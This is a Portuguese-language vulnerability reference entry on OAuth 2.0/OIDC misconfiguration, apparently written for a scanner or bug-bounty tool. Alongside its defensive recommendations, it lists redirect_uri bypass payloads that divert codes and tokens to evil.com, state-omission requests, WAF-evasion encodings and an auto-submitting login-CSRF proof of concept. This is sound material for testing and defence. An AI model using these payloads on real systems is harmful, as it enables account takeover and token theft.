---
id: oauth_misconfiguration
title: "OAuth 2.0 / OIDC Misconfiguration"
module: "oauth"
severity: "CRITICAL"
cwe_id: "CWE-352"
cwe_title: "Cross-Site Request Forgery (CSRF)"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"
vrt_id: "broken_authentication_and_session_management.oauth_misconfiguration"
---

## Summary
Falhas em fluxos OAuth 2.0/OIDC — `state` ausente, `redirect_uri` permissivo, PKCE não exigido, tokens vazados ou escopo excessivo — permitem account takeover, roubo de token e acesso indevido a recursos.

## Description
OAuth 2.0 delega autorização entre resource owner, client, authorization server e resource server. O fluxo de autorização é seguro apenas quando o client valida o `state`, o authorization server exige correspondência exata de `redirect_uri`, o código é de uso único e vinculado ao client/PKCE, e os tokens são transportados em canais protegidos.

Problemas comuns:

- **CSRF no fluxo de autorização:** ausência ou reutilização de `state` permite que o atacante faça o navegador da vítima concluir um fluxo com a conta do atacante (login CSRF) ou vincule uma conta social maliciosa.
- **redirect_uri permissivo:** validação por prefixo, regex, path traversal, subdomínio controlado, wildcard ou `@` permite desviar o `code`/token para o atacante.
- **PKCE ausente:** em clients públicos (SPA, mobile), o `code` interceptado pode ser trocado por token.
- **Implicit flow:** tokens no fragmento da URL ficam expostos a histórico, Referer e XSS.
- **Token leakage:** `access_token` em query string, logs, Referer, mensagens de erro ou open redirect.
- **Escopo excessivo / scope upgrade:** client solicita escopos administrativos ou o servidor ignora o escopo consentido.
- **Pre-account takeover:** e-mail não verificado no provedor permite que o atacante crie conta com o e-mail da vítima antes do primeiro login social.
- **OIDC mal validado:** `iss`, `aud`, `nonce`, `azp`, `at_hash` não verificados; JWKS aceito de qualquer issuer.

## Impact
- Account takeover completo, inclusive de contas administrativas.
- Roubo de access/refresh tokens e acesso persistente a APIs e dados.
- Login CSRF: vítima opera na conta do atacante e vaza dados/arquivos.
- Autorização indevida entre tenants e escalada de escopo.
- Vazamento de PII, dados financeiros e comunicações; impacto CRITICAL.

## Payloads and Bypasses
```text
# CSRF: remover state, reutilizar state ou usar state previsível
GET /oauth/authorize?client_id=app&redirect_uri=https://alvo.com/cb&response_type=code&scope=openid
GET /oauth/authorize?client_id=app&redirect_uri=https://alvo.com/cb&response_type=code&state=fixed

# redirect_uri bypass
redirect_uri=https://alvo.com.evil.com/cb
redirect_uri=https://evil.com/cb
redirect_uri=https://alvo.com@evil.com/cb
redirect_uri=https://alvo.com%2f@evil.com/cb
redirect_uri=https://alvo.com%5c@evil.com/cb
redirect_uri=https://alvo.com/cb/../../evil
redirect_uri=https://alvo.com/cb?next=https://evil.com
redirect_uri=https://alvo.com/cb%23@evil.com
redirect_uri=https://alvo.com/cb%00.evil.com
redirect_uri=https://alvo.com:443@evil.com

# Path confusion
redirect_uri=https://alvo.com/callback/..%2f..%2fevil
redirect_uri=https://alvo.com/callback%2f..%2f..%2fevil

# Implicit / token leakage
response_type=token
response_type=id_token token
redirect_uri=https://alvo.com/cb#access_token=...
```

PoC de login CSRF:
```html
<form action="https://alvo.com/oauth/authorize" method="GET">
  <input name="client_id" value="app">
  <input name="redirect_uri" value="https://alvo.com/cb">
  <input name="response_type" value="code">
  <input name="scope" value="openid email profile">
</form>
<script>document.forms[0].submit()</script>
```

Variações de bypass de WAF/filtros:
```text
- Codificação dupla do host: https://alvo.com%252eevil.com
- Unicode/IDN: https://alvo.com。evil.com
- Backslash: https://alvo.com\@evil.com
- Fragmento e query: https://alvo.com/cb#https://evil.com
- Redirecionamento encadeado: redirect_uri aponta para open redirect no domínio confiável
- Case: HTTPS://ALVO.COM@EVIL.COM
```

Casos reais e mentalidade de ataque (RWBH): Facebook, Uber e Twitter ilustram os três padrões mais recorrentes — `redirect_uri` permissivo, `state` ausente e vazamento de token em URLs/Referer.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `client_id`, `redirect_uri`, `response_type`, `scope`, `state`, `nonce`, `code`, `access_token`, `id_token`, `refresh_token`, `grant_type`, `code_verifier`.
- **Paths comuns:** `/oauth/authorize`, `/oauth/token`, `/oauth/introspect`, `/oauth/revoke`, `/login/oauth`, `/.well-known/openid-configuration`, `/.well-known/jwks.json`, `/callback`.
- **Sinais:** `state` ausente; `redirect_uri` com wildcard; `response_type=token`; `scope` amplo; `nonce` não validado; tokens em URL.

## Recommendation
1. Exigir `state` criptograficamente aleatório, vinculado à sessão e de uso único; rejeitar requisições sem `state`.
2. Validar `redirect_uri` por correspondência exata contra allowlist registrada; não usar prefixo, regex ou wildcard. Normalizar e rejeitar userinfo, fragmentos e path traversal.
3. Exigir PKCE (`S256`) para clients públicos e, idealmente, para todos; vincular o `code` ao `client_id` e ao `code_verifier`.
4. Desabilitar implicit flow e client credentials em browsers; usar authorization code + PKCE.
5. Validar `iss`, `aud`, `azp`, `nonce`, `exp`, `iat` e assinatura do ID token com JWKS do issuer correto.
6. Não colocar tokens em query string; usar fragmento apenas em fluxos legados e nunca registrar tokens em logs.
7. Aplicar escopo mínimo e consentimento explícito; validar escopo no resource server, não apenas no token.
8. Exigir e-mail verificado antes de vincular contas sociais; implementar confirmação para prevenir pre-account takeover.
9. Rotacionar refresh tokens, permitir revogação e detectar reutilização.
10. Exemplo de validação de redirect:
```java
Set<String> allowed = Set.of("https://app.alvo.com/callback", "https://admin.alvo.com/callback");
URI uri = URI.create(redirectUri);
if (!allowed.contains(uri.toString()) || uri.getUserInfo() != null || uri.getFragment() != null) {
    throw new OAuth2AuthenticationException("invalid_redirect_uri");
}
```
